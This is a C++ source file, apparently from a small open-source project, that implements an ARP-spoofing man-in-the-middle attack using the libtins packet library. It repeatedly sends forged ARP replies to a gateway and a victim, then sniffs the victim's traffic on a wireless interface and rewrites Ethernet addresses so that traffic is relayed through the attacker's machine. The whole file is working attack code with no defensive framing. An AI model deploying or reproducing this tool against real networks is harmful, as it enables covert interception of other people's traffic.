/*The MIT License (MIT)
*
* Copyright (c) 2016 5kyc1ad(SangHyeon Jeon)
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/


#include "mitm.h"


// Initializer
MITM::MITM(char *_gateway, char *_victim) : NW_Info(_gateway, _victim) {
    m_config.set_filter(std::string("ip dst " + m_victim.to_string() + " or ip src " + m_victim.to_string()));
    std::clog << "[*] Sniffer ready" << std::endl;
}

void MITM::startARPSpoofing() {
    std::cout << "[*][*] MITM Attack Configure" << std::endl;
    std::clog << "[*] Own        => " << m_myInfo.ip_addr << " - " << m_myInfo.hw_addr << std::endl;
    std::clog << "[*] Gateway    => " << m_gateway << " - " << m_gateway_hw << std::endl;
    std::clog << "[*] Victim     => " << m_victim << " - " << m_victim_hw << std::endl;

    ARP arp_toGateway(m_gateway, m_victim, m_gateway_hw, m_myInfo.hw_addr), arp_toVictim(m_victim, m_gateway, m_victim_hw, m_myInfo.hw_addr);
    arp_toGateway.opcode(ARP::REPLY);
    arp_toVictim.opcode(ARP::REPLY);

    // Generate Ethernet Packet for Capsulation
    EthernetII eth_toGateway = EthernetII(m_gateway_hw, m_myInfo.hw_addr) / arp_toGateway;
    EthernetII eth_toVictim  = EthernetII(m_victim_hw, m_myInfo.hw_addr) / arp_toVictim;

    std::cout << "[*][*] ARP Spoofing Attack Start" << std::endl;

    while(true) {
        m_pSender.send(eth_toGateway, m_iface);
        m_pSender.send(eth_toVictim, m_iface);
        std::clog << "[*] Do ARP Spoofing" << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

void MITM::startExchanging() {
    std::this_thread::sleep_for(std::chrono::seconds(5));
    Sniffer sniffer("wlan0", m_config);
    std::clog << "[*] Start Sniffing" << std::endl;
    sniffer.sniff_loop(make_sniffer_handler(this, &MITM::packetHandler));
}

bool MITM::packetHandler(PDU &pdu) {
    std::clog << pdu.rfind_pdu<EthernetII>().src_addr() << " => " << pdu.rfind_pdu<EthernetII>().dst_addr() << std::endl;
    try {
        if(pdu.rfind_pdu<EthernetII>().src_addr() == m_victim_hw) { // [Victim] => [GW]
            std::clog << "Victim => GW" << std::endl;
            pdu.rfind_pdu<EthernetII>().dst_addr(m_gateway_hw);
            pdu.rfind_pdu<EthernetII>().src_addr(m_myInfo.hw_addr);
            m_pSender.send(pdu); // [MY_HW] => [GW_HW]
            std::clog << "Packet sended" << std::endl;
        }
        else if (pdu.rfind_pdu<EthernetII>().src_addr() == m_gateway_hw) { // [GW] => [Victim]
            std::clog << "GW => Victim" << std::endl;
            pdu.rfind_pdu<EthernetII>().dst_addr(m_victim_hw);
            m_pSender.send(pdu); // [MY_HW] => [GW_HW]
            std::clog << "Packet sended" << std::endl;
        }
    } catch(std::runtime_error& error) {
        std::clog << "Error, Restart" << std::endl;
    }
    return true;
}

void MITM::startMITM() {
    std::thread arpThread(&MITM::startARPSpoofing, this);
    std::thread sniffThread(&MITM::startExchanging, this);
    arpThread.join();
    sniffThread.join();
}